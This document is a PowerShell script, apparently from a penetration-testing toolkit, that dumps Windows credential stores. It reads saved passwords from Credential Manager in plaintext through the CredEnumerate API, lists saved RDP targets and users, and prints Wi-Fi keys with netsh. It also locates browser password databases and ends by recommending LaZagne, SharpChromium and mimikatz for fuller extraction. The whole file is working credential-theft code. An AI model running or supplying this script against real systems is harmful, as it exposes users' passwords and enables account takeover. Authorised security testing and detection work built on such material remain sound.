<#
.SYNOPSIS
    Windows Credential Manager & Vault Dumper

.DESCRIPTION
    Extracts credentials stored by thick-client applications in:
    - Windows Credential Manager (cmdkey /list)
    - Windows Vault (VaultCli)
    - Saved RDP credentials
    - Browser saved passwords (SQLite databases)
    - Wi-Fi passwords (netsh)

    Many thick clients use CredWrite/CredRead to store passwords,
    which are accessible to any process running as the same user.

    MITRE ATT&CK: T1555 — Credentials from Password Stores

.PARAMETER Target
    Filter results to a specific target (e.g., app name or server)

.EXAMPLE
    .\windows_credential_dump.ps1
    .\windows_credential_dump.ps1 -Target "TargetApp"
#>

param(
    [string]$Target = ""
)

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class CredManager {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr pCredentials);

    [DllImport("advapi32.dll")]
    public static extern void CredFree(IntPtr buffer);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDENTIAL {
        public int Flags;
        public int Type;
        public string TargetName;
        public string Comment;
        public long LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist;
        public int AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias;
        public string UserName;
    }
}
"@

Write-Host "`n[*] Windows Credential Store Dumper`n" -ForegroundColor Cyan

# ── 1. Credential Manager (CredEnumerate API) ──
Write-Host "--- Credential Manager (API) ---" -ForegroundColor Yellow

$count = 0
$pCreds = [IntPtr]::Zero

$filter = if ($Target) { "*$Target*" } else { $null }
$success = [CredManager]::CredEnumerate($filter, 0, [ref]$count, [ref]$pCreds)

if ($success -and $count -gt 0) {
    $ptrSize = [IntPtr]::Size
    for ($i = 0; $i -lt $count; $i++) {
        $credPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr($pCreds, $i * $ptrSize)
        $cred = [Runtime.InteropServices.Marshal]::PtrToStructure($credPtr, [Type][CredManager+CREDENTIAL])

        $password = ""
        if ($cred.CredentialBlobSize -gt 0 -and $cred.CredentialBlob -ne [IntPtr]::Zero) {
            $password = [Runtime.InteropServices.Marshal]::PtrToStringUni($cred.CredentialBlob, $cred.CredentialBlobSize / 2)
        }

        $typeNames = @{
            1 = "Generic"
            2 = "Domain Password"
            3 = "Domain Certificate"
            4 = "Domain Visible Password"
            5 = "Generic Certificate"
            6 = "Domain Extended"
        }
        $typeName = if ($typeNames.ContainsKey($cred.Type)) { $typeNames[$cred.Type] } else { "Unknown ($($cred.Type))" }

        Write-Host "[CRED] $($cred.TargetName)" -ForegroundColor Red
        Write-Host "  Type: $typeName"
        Write-Host "  User: $($cred.UserName)"
        if ($password) {
            Write-Host "  Password: $password" -ForegroundColor Red
        } else {
            Write-Host "  Password: <binary/empty>"
        }
        Write-Host ""
    }
    [CredManager]::CredFree($pCreds)
    Write-Host "[+] Found $count credential(s)`n"
} else {
    Write-Host "[-] No credentials found (or access denied)`n"
}

# ── 2. cmdkey output (fallback) ──
Write-Host "--- Credential Manager (cmdkey) ---" -ForegroundColor Yellow
$cmdkey = & cmdkey /list 2>&1
$cmdkey | ForEach-Object {
    if ($_ -match "Target:|User:|Type:") {
        if ($Target -and $_ -notmatch $Target) { return }
        Write-Host "  $_"
    }
}
Write-Host ""

# ── 3. Saved RDP Credentials ──
Write-Host "--- Saved RDP Credentials ---" -ForegroundColor Yellow
$rdpServers = Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue
foreach ($server in $rdpServers) {
    $serverName = $server.PSChildName
    if ($Target -and $serverName -notmatch $Target) { continue }
    $username = (Get-ItemProperty $server.PSPath -ErrorAction SilentlyContinue).UsernameHint
    Write-Host "[RDP] $serverName — User: $username" -ForegroundColor Yellow
}

# Default.rdp files
$rdpDefault = "$env:USERPROFILE\Documents\Default.rdp"
if (Test-Path $rdpDefault) {
    $content = Get-Content $rdpDefault -Raw
    if ($content -match "full address:s:(.+)") {
        Write-Host "[RDP] Default.rdp: $($Matches[1])" -ForegroundColor Yellow
    }
}
Write-Host ""

# ── 4. Wi-Fi Passwords ──
Write-Host "--- Wi-Fi Passwords ---" -ForegroundColor Yellow
try {
    $profiles = & netsh wlan show profiles 2>$null
    $profileNames = ($profiles | Select-String "All User Profile\s+:\s+(.+)" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() })
    foreach ($name in $profileNames) {
        $detail = & netsh wlan show profile name="$name" key=clear 2>$null
        $keyMatch = $detail | Select-String "Key Content\s+:\s+(.+)"
        if ($keyMatch) {
            Write-Host "[WIFI] $name — Password: $($keyMatch.Matches.Groups[1].Value.Trim())" -ForegroundColor Red
        }
    }
} catch {}
Write-Host ""

# ── 5. Browser Password DB Locations ──
Write-Host "--- Browser Password Store Locations ---" -ForegroundColor Yellow

$browserPaths = @(
    @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
    @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
    @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"},
    @{Name="Firefox"; Path="$env:APPDATA\Mozilla\Firefox\Profiles"}
)

foreach ($browser in $browserPaths) {
    if ($browser.Name -eq "Firefox") {
        if (Test-Path $browser.Path) {
            $profiles = Get-ChildItem $browser.Path -Directory -ErrorAction SilentlyContinue
            foreach ($p in $profiles) {
                $logins = Join-Path $p.FullName "logins.json"
                $key4 = Join-Path $p.FullName "key4.db"
                if (Test-Path $logins) {
                    Write-Host "[$($browser.Name)] $logins" -ForegroundColor Yellow
                    Write-Host "  Key DB: $key4"
                    Write-Host "  Decrypt: Use firefox_decrypt.py or firepwd.py"
                }
            }
        }
    } else {
        if (Test-Path $browser.Path) {
            Write-Host "[$($browser.Name)] $($browser.Path)" -ForegroundColor Yellow
            Write-Host "  Encrypted with DPAPI — decrypt with CryptUnprotectData"
            Write-Host "  Tools: SharpChromium, HackBrowserData, LaZagne"
        }
    }
}

Write-Host "`n[*] For full credential extraction, use:" -ForegroundColor Cyan
Write-Host "  - LaZagne: lazagne.exe all"
Write-Host "  - SharpChromium: SharpChromium.exe logins"
Write-Host "  - mimikatz: sekurlsa::logonpasswords"
Write-Host "  - dpapi_decrypt.ps1 (in insecure-storage folder)"
